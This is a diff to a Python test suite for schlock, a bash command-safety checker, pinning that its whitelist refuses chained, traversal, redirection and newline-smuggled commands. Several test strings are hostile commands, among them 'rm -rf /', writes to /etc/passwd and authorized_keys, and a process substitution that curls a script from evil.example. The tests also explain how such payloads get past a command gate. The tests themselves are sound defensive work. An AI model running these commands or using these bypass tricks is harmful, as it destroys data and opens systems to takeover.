@@ -1,9 +1,23 @@
 """Tests for RuleEngine."""
 
-import pytest
+import re
 
+import pytest
+import yaml
+
+from schlock.core.parser import BashCommandParser
 from schlock.core.rules import RiskLevel, RuleEngine, RuleMatch, SecurityRule
 from schlock.exceptions import ConfigurationError
+
+
+def _segment_count(command: str) -> int:
+    """How many commands the parser finds -- the count validate_command passes the whole-line check.
+
+    Taken from the parser, never written as a literal: a hard-coded count lets a test pass on the
+    whitelist data alone, with the count the gate is actually handed never exercised.
+    """
+    parser = BashCommandParser()
+    return len(parser.extract_command_segments(command, parser.parse(command)))
 
 
 @pytest.fixture
@@ -112,33 +126,11 @@ rules:
         engine = RuleEngine(test_rules_file)
         assert engine.is_whitelisted(command) == should_be_whitelisted
 
-    @pytest.mark.parametrize(
-        "command,fully_whitelisted",
-        [
-            ("git status", True),
-            ("git status\n", True),  # trailing whitespace does not defeat the span check
-            ("git status --short", False),  # prefix pattern stops at "status"
-            ("git status; rm -rf /", False),  # LAB-2752: prefix must not cover the chain
-            ("git push", False),
-        ],
-    )
-    def test_is_fully_whitelisted_requires_full_span(self, test_rules_file, command, fully_whitelisted):
-        """LAB-2752: is_fully_whitelisted() needs the match to reach the command's end."""
-        engine = RuleEngine(test_rules_file)
-        assert engine.is_fully_whitelisted(command) == fully_whitelisted
-
     def test_is_whitelisted_keeps_prefix_semantics(self, test_rules_file):
         """AC-5: the prefix contract (issue #66) is untouched for single-segment callers."""
         engine = RuleEngine(test_rules_file)
         assert engine.is_whitelisted("git status --short")
         assert engine.is_whitelisted("git status; rm -rf /")
-
-    def test_is_fully_whitelisted_allows_pattern_to_overshoot_rstrip(self, tmp_path):
-        """The ">=" is load-bearing: a "\\s*" tail spans whitespace rstrip() discounted."""
-        rules = tmp_path / "trailing.yaml"
-        rules.write_text("whitelist:\n  - ^git\\s+status\\s*$\nrules: []\n")
-        engine = RuleEngine(rules)
-        assert engine.is_fully_whitelisted("git status  ")
 
     def test_match_command_can_skip_the_whitelist(self, test_rules_file):
         """use_whitelist=False lets the multi-segment fallback re-check a command whose
@@ -414,6 +406,141 @@ rules: []
         assert engine.is_whitelisted("git status")
         assert engine.is_whitelisted("ls")
         assert not engine.is_whitelisted("git push")
+
+    def test_a_single_command_entry_declares_no_separator_and_clears_no_line(self, rules_directory):
+        """`^ls\\b` describes one command, so it can never speak for a line that holds two."""
+        engine = RuleEngine.from_directory(rules_directory)
+
+        # The prefix test still clears the single command each pattern was written for --
+        # including, and this is the bug it exists to keep out of the fast path, a line that
+        # carries a second command.
+        assert engine.is_whitelisted("ls -la")
+        assert engine.is_whitelisted("ls && rm -rf /")
+
+        # Declaring no separator means speaking for one command, so no line is ever cleared.
+        assert not engine.is_whitelisted_whole("ls && rm -rf /", 2)
+        assert not engine.is_whitelisted_whole("git status && rm -rf /", 2)
+
+    def test_an_entry_is_held_to_the_number_of_commands_it_declares(self, tmp_path):
+        """Anchoring is not sufficient, and neither is merely mentioning a separator."""
+        rules_dir = tmp_path / "declared"
+        rules_dir.mkdir()
+        (rules_dir / "01_whitelist.yaml").write_text(r"""
+whitelist:
+  - ^rm\s+-rf\s+(dist|build)(/.*)?$
+  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+\S+\s+-u\s+\S+\s+--password-stdin$
+
+rules: []
+""")
+        engine = RuleEngine.from_directory(rules_dir)
+
+        # Anchored AND open-ended: `.*` consumes the chained payload, so this pattern really
+        # does fullmatch the whole line. It declares no separator, so it speaks for one
+        # command -- note its `|`s are alternation and must not be counted as separators.
+        assert engine.whitelist_patterns[0].fullmatch("rm -rf dist/ && rm -rf /")
+        assert not engine.is_whitelisted_whole("rm -rf dist/ && rm -rf /", 2)
+
+        # The entry that declares one separator clears its own two-command pipeline...
+        pipeline = "gh auth token | docker login ghcr.io -u me --password-stdin"
+        assert engine.is_whitelisted_whole(pipeline, 2)
+        # ...and `$` matches before a trailing newline, so the command is stripped first.
+        assert engine.is_whitelisted_whole(pipeline + "\n", 2)
+        # ...but it declared TWO commands, so it cannot speak for a third. `\S+` matches `;`,
+        # which is how a payload rides an entry that does write a separator.
+        injected = "gh auth token | docker login ghcr.io -u foo;sudo;true --password-stdin"
+        assert engine.whitelist_patterns[1].fullmatch(injected)
+        assert not engine.is_whitelisted_whole(injected, 4)
+        assert not engine.is_whitelisted_whole(pipeline + " && rm -rf /", 3)
+
+    def test_an_entry_declaring_no_separator_clears_nothing_here_even_alone(self, rules_directory):
+        """Holds standing alone, not only because the one caller guards `len(segments) > 1`."""
+        engine = RuleEngine.from_directory(rules_directory)
+
+        assert engine.is_whitelisted("ls")  # the prefix test is how a single command clears
+        assert not engine.is_whitelisted_whole("ls", 1)
+        assert not engine.is_whitelisted_whole("ls -la", 1)
+
+    def test_an_unanchored_entry_covers_only_the_arguments_it_described(self, tmp_path):
+        """Counting commands says nothing about a command's arguments; the anchor does.
+
+        Every separator-writing pattern schlock ships is also `$`-anchored, so `match` and
+        `fullmatch` agree on all of them. A user's own pipeline entry need not be anchored,
+        and there only `fullmatch` stops it vouching for arguments it never mentioned.
+        """
+        rules_dir = tmp_path / "unanchored"
+        rules_dir.mkdir()
+        (rules_dir / "01_whitelist.yaml").write_text(r"""
+whitelist:
+  - ^foo\s*\|\s*bar
+
+rules: []
+""")
+        engine = RuleEngine.from_directory(rules_dir)
+
+        assert engine.is_whitelisted_whole("foo | bar", 2)
+        # Two commands, so the count is satisfied -- but the entry never described `-rf /etc`.
+        assert not engine.is_whitelisted_whole("foo | bar -rf /etc", 2)
+
+    def test_counting_clears_the_legal_multi_line_spelling_that_a_newline_ban_would_not(self, tmp_path):
+        """A newline after `|` is a bash CONTINUATION, not a separator: still two commands."""
+        rules_dir = tmp_path / "continuation"
+        rules_dir.mkdir()
+        (rules_dir / "01_whitelist.yaml").write_text(r"""
+whitelist:
+  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+\S+\s+--password-stdin$
+
+rules: []
+""")
+        engine = RuleEngine.from_directory(rules_dir)
+
+        # bash reads this as one two-command pipeline, and so does the count.
+        assert engine.is_whitelisted_whole("gh auth token |\n  docker login ghcr.io --password-stdin", 2)
+        # But `\s` also spans a line break the author never wrote, turning one regex "command"
+        # into several for bash. The count sees through that where the pattern cannot.
+        assert not engine.is_whitelisted_whole("gh auth token | docker login\nsudo\n--password-stdin", 4)
+
+    def test_a_bracket_expression_is_a_slot_not_a_declared_separator(self, tmp_path):
+        """`[^;]` and `[\\w;]` mention `;` without writing a boundary, so neither declares one."""
+        rules_dir = tmp_path / "classes"
+        rules_dir.mkdir()
+        (rules_dir / "01_whitelist.yaml").write_text(r"""
+whitelist:
+  - ^mytool\s+[^;]+$
+  - ^cd\s+[\w;]+\s*&&\s*make$
+  - ^foo\s*[;]\s*bar$
+
+rules: []
+""")
+        engine = RuleEngine.from_directory(rules_dir)
+
+        # A negated class writes no separator: this entry speaks for one command, however well
+        # it matches a longer line.
+        assert engine.whitelist_patterns[0].fullmatch("mytool x && rm -rf /")
+        assert not engine.is_whitelisted_whole("mytool x && rm -rf /", 2)
+        # A class holding `;` among other characters does not add to the one `&&` declares.
+        assert engine.is_whitelisted_whole("cd src && make", 2)
+        assert not engine.is_whitelisted_whole("cd a;rm && make", 3)
+        # A class holding nothing but the separator is the separator.
+        assert engine.is_whitelisted_whole("foo; bar", 2)
+
+    def test_whitespace_bash_reads_as_a_word_never_clears_a_line(self, tmp_path):
+        """Only space, tab and newline are blank to bash; `\\s` and `strip()` accept far more."""
+        rules_dir = tmp_path / "blanks"
+        rules_dir.mkdir()
+        (rules_dir / "01_whitelist.yaml").write_text(r"""
+whitelist:
+  - ^gh\s+auth\s+token\s*\|\s*docker\s+login\s+ghcr\.io\s+-u\s+[A-Za-z0-9._@-]+\s+--password-stdin$
+
+rules: []
+""")
+        engine = RuleEngine.from_directory(rules_dir)
+        pipeline = "gh auth token | docker login ghcr.io -u me --password-stdin"
+
+        assert engine.is_whitelisted_whole(" \t\n" + pipeline + " \t\n", 2)
+        for blank in ("\r", "\x0b", "\x0c", "\x1c", "\x1f", "\x85", "\xa0", "\u2028", "\u3000"):
+            assert not engine.is_whitelisted_whole(pipeline + "\n" + blank, 2)
+            assert not engine.is_whitelisted_whole(blank + "\n" + pipeline, 2)
+            assert not engine.is_whitelisted_whole(pipeline.replace("|", "|\n" + blank + "\n"), 2)
 
     def test_directory_files_loaded_in_order(self, rules_directory):
         """Test that files are loaded in alphabetical order."""
@@ -882,3 +1009,231 @@ rules:
         )
         rule = next(r for r in engine_with_self_protection.rules if r.name == "azure_credential_theft")
         assert rule.risk_level == RiskLevel.BLOCKED
+
+
+class TestWhitelistClearsOnlyWhatItDescribes:
+    """LAB-4310: a whitelist entry must vouch for the command it DESCRIBES and no more.
+
+    The layers are pinned SEPARATELY on purpose. The YAML bounds and the engine
+    guard both reject "chmod -R 777 /tmp/../..", so a test that only went through
+    is_whitelisted() would stay green with either one reverted - each masking the
+    other's mutation. The shipped-pattern tests below therefore match the compiled
+    regex directly, and the engine tests use a fixture entry that no YAML bound
+    touches.
+    """
+
+    @pytest.fixture
+    def shipped_rules_dir(self, data_dir):
+        """The rule set schlock actually ships, not a synthetic fixture.
+
+        LAB-4290's lesson (and this ticket's AC-7): a mutation survived 2416 tests
+        because the shipped data hid the case. These entries are the artifact under
+        test, so they are read from disk.
+        """
+        return data_dir / "rules"
+
+    @staticmethod
+    def _shipped_whitelist(shipped_rules_dir) -> list[str]:
+        text = (shipped_rules_dir / "00_whitelist.yaml").read_text()
+        return yaml.safe_load(text)["whitelist"]
+
+    @pytest.fixture
+    def chmod_tmp_patterns(self, shipped_rules_dir):
+        """The two /tmp chmod entries, compiled, straight from the shipped YAML."""
+        pats = [p for p in self._shipped_whitelist(shipped_rules_dir) if p.startswith("^chmod")]
+        assert len(pats) == 2, f"expected exactly 2 /tmp chmod entries, got {pats}"
+        return [re.compile(p) for p in pats]
+
+    # --- Layer 1: the YAML bounds, measured on the pattern itself -------------
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "chmod 755 /tmp/x /etc/shadow",  # AC-1: second operand rode the unanchored tail
+            "chmod -R 777 /tmp/a /",  # AC-1: ... and this second operand is "/"
+            "chmod 755 /tmp/x --reference=/etc/shadow",
+        ],
+    )
+    def test_shipped_chmod_entries_reject_extra_operands(self, chmod_tmp_patterns, command):
+        """Reverting the "$" anchor on either /tmp chmod entry fails this test."""
+        assert not any(p.match(command) for p in chmod_tmp_patterns)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "chmod -R 777 /tmp/../..",  # AC-2/AC-5: this IS "chmod -R 777 /"
+            "chmod 755 /tmp/../etc/shadow",
+            "chmod 777 /tmp/../../etc/shadow",  # the one LAB-2764 row that is ours
+            "chmod 755 /tmp/build/../../etc",  # ".." in a LATER segment, not just the first
+            "chmod 755 /tmp/./x",  # a bare "." segment is refused by the same shape
+        ],
+    )
+    def test_shipped_chmod_entries_reject_dot_dot_in_any_position(self, chmod_tmp_patterns, command):
+        """AC-5. Reverting the segment shape to a plain charset fails this test.
+
+        Separate from the engine guard test below: this one bypasses
+        is_whitelisted() entirely, so the guard cannot stand in for the bound.
+        """
+        assert not any(p.match(command) for p in chmod_tmp_patterns)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "chmod 755 /tmp/x",
+            "chmod -R 777 /tmp/build",
+            "chmod 755 /tmp/.pytest_cache",  # a leading dot is a normal name, not traversal
+            "chmod -R 700 /tmp/pytest-of-me/pytest-0/test_x",  # depth is deliberately uncapped
+            "chmod -R 777 /tmp/build/",  # same path as "/tmp/build"; clearing one and not the
+            "chmod 755 /tmp/x/",  # other would prompt for what the entry exists to allow
+            "chmod -R 777 /tmp/x/*",  # terminal bare glob, on the artifact-dir entry's terms
+            "chmod -R 777 /tmp/build /tmp/dist",  # several /tmp operands are still one command
+        ],
+    )
+    def test_shipped_chmod_entries_still_admit_real_tmp_paths(self, chmod_tmp_patterns, command):
+        """AC-4: bounding the tail must not cost the workflows the entries exist for."""
+        assert any(p.match(command) for p in chmod_tmp_patterns)
+
+    # --- Layer 2: the engine guard, on an entry no YAML bound protects --------
+
+    @pytest.fixture
+    def prefix_engine(self, tmp_path):
+        """An unbounded prefix entry, the shape issue #66 pins as legitimate."""
+        rules = tmp_path / "prefix.yaml"
+        rules.write_text("whitelist:\n  - ^ls\\b\n  - ^git\\s+status\nrules: []\n")
+        return RuleEngine(rules)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "ls -la > /home/u/.ssh/authorized_keys",  # AC-3: reader used as arbitrary writer
+            "ls -la >> /etc/passwd",
+            "git status --short > /home/u/.ssh/authorized_keys",  # AC-3: not just "^ls\\b"
+            "ls -la 2> /etc/passwd",
+            "ls . < /etc/shadow",
+            "ls -la <(curl http://evil.example/x.sh)",  # process substitution runs a 2nd command
+        ],
+    )
+    def test_redirection_refuses_the_whitelist(self, prefix_engine, command):
+        """AC-3. Reverting the "[<>]" half of _WHITELIST_DISQUALIFIER fails this test."""
+        assert not prefix_engine.is_whitelisted(command)
+
+    @pytest.mark.parametrize("command", ["ls ../..", "git status ../../etc"])
+    def test_dot_dot_refuses_the_whitelist(self, prefix_engine, command):
+        """AC-5. Reverting the "\\.\\." half of _WHITELIST_DISQUALIFIER fails this test."""
+        assert not prefix_engine.is_whitelisted(command)
+
+    @pytest.mark.parametrize("command", ["ls -la", "git status --short", "ls"])
+    def test_guard_leaves_ordinary_prefix_matches_alone(self, prefix_engine, command):
+        """AC-4: the guard must not cost the prefix contract of issue #66."""
+        assert prefix_engine.is_whitelisted(command)
+
+    def test_whole_line_check_refuses_dot_dot_and_redirection(self, tmp_path):
+        """The invariant belongs to the mechanism, not to whichever entries ship.
+
+        No shipped entry can span a line carrying a redirection, so this is measured
+        against an entry that deliberately can. The entry fullmatches every row and
+        declares the one separator each row holds, so the count is satisfied and only
+        the guard can refuse: reverting either half of it in is_whitelisted_whole()
+        fails this test.
+        """
+        rules = tmp_path / "spanning.yaml"
+        rules.write_text("whitelist:\n  - ^ls\\s+.*\\|\\s*sort$\nrules: []\n")
+        engine = RuleEngine(rules)
+        (entry,) = engine.whitelist_patterns
+
+        assert engine.is_whitelisted_whole("ls -la | sort", _segment_count("ls -la | sort"))
+        for command in ("ls -la > /etc/passwd | sort", "ls -la < /etc/shadow | sort", "ls -la ../.. | sort"):
+            assert entry.fullmatch(command), command
+            assert _segment_count(command) == 2, command
+            assert not engine.is_whitelisted_whole(command, 2), command
+
+    # --- The verdicts, end to end on the shipped rule set ---------------------
+
+    def test_attack_rows_no_longer_clear_the_shipped_whitelist(self, shipped_rules_dir):
+        """AC-1/2/3/5 through the real engine, all entries loaded together."""
+        engine = RuleEngine.from_directory(shipped_rules_dir)
+        for command in (
+            "chmod 755 /tmp/x /etc/shadow",
+            "chmod -R 777 /tmp/a /",
+            "chmod -R 777 /tmp/../..",
+            "chmod 755 /tmp/../etc/shadow",
+            "chmod 777 /tmp/../../etc/shadow",
+            "ls -la > /home/u/.ssh/authorized_keys",
+            "ls -la >> /etc/passwd",
+            "git status --short > /home/u/.ssh/authorized_keys",
+        ):
+            assert not engine.is_whitelisted(command), command
+
+    def test_positive_controls_still_clear_the_shipped_whitelist(self, shipped_rules_dir):
+        """AC-4: the five controls stay whitelisted and stay SAFE."""
+        engine = RuleEngine.from_directory(shipped_rules_dir)
+        for command in (
+            "chmod 755 /tmp/x",
+            "chmod -R 777 /tmp/build",
+            "rm -rf .git/hooks",
+            "ls -la",
+            "git status",
+        ):
+            assert engine.is_whitelisted(command), command
+            assert engine.match_command(command).risk_level == RiskLevel.SAFE, command
+
+
+class TestWhitelistRefusesCommandSeparators:
+    """LAB-4310 review finding: every "\\s" in a whitelist pattern matches a NEWLINE.
+
+    So a "$"-anchored entry spans a string bash runs as several commands:
+    "chmod\\n-R\\n777\\n/tmp/evil.sh" satisfies the /tmp chmod entry end to end,
+    with "/tmp/evil.sh" left as a command bash executes, not an operand. The prefix
+    check refuses a line break outright. The whole-line check that short-circuits
+    validator.py's multi-segment branch refuses it by counting instead: the extra
+    lines are extra commands the entry never declared.
+    """
+
+    @pytest.fixture
+    def shipped_engine(self, data_dir):
+        return RuleEngine.from_directory(data_dir / "rules")
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "chmod\n-R\n777\n/tmp/evil.sh",  # the regression the "$" anchor introduced
+            "chmod\n777\n/tmp/evil.sh",
+            "chmod -R\n777 /tmp/x",
+            "rm\n-rf\n.git/hooks",  # pre-existing, same cause, closed by the same guard
+            "chmod 755 /tmp/x\rrm -rf /",  # a bare CR is a separator to some readers
+            "ls -la\rrm -rf /",  # the row above is refused by the /tmp entry's charset, guard or not; this only by it
+            # The one shipped entry that declares a separator, with the extra lines riding its
+            # user slot: it fullmatches, so only the count stands between it and SAFE.
+            "gh auth token | docker login ghcr.io -u\npoweroff\n--password-stdin",
+        ],
+    )
+    def test_embedded_newline_refuses_both_whitelist_checks(self, shipped_engine, command):
+        """Reverting the "\\n\\r" half of _WHITELIST_DISQUALIFIER fails this test.
+
+        is_whitelisted_whole is asserted explicitly: it is the multi-segment
+        short-circuit, so it is the one that skips the per-segment loop. It carries
+        no newline guard. Only the gh row exercises the count here: the other rows
+        match no entry that declares a separator, so no count can clear them.
+        """
+        assert not shipped_engine.is_whitelisted(command)
+        assert not shipped_engine.is_whitelisted_whole(command, _segment_count(command))
+
+    @pytest.mark.parametrize("command", ["git status\n", "ls -la\n", "chmod 755 /tmp/x\n"])
+    def test_one_trailing_newline_still_whitelists(self, shipped_engine, command):
+        """The guard reads command.rstrip(); dropping that rstrip fails this test.
+
+        A trailing newline is not a separator - there is no second command after
+        it. Refusing it would be a regression, not a fix.
+        """
+        assert shipped_engine.is_whitelisted(command)
+
+    def test_compile_warns_when_an_entry_can_never_match(self, tmp_path, caplog):
+        """A user whitelist entry describing a redirect is refused before patterns
+        are consulted, so it would silently never fire. Warn rather than fail
+        silently - the user has nothing else to go on."""
+        rules = tmp_path / "userwl.yaml"
+        rules.write_text("whitelist:\n  - '^psql\\s+mydb\\s+<\\s+schema\\.sql$'\nrules: []\n")
+        with caplog.at_level("WARNING"):
+            engine = RuleEngine(rules)
+        assert "may never match" in caplog.text
+        assert not engine.is_whitelisted("psql mydb < schema.sql")
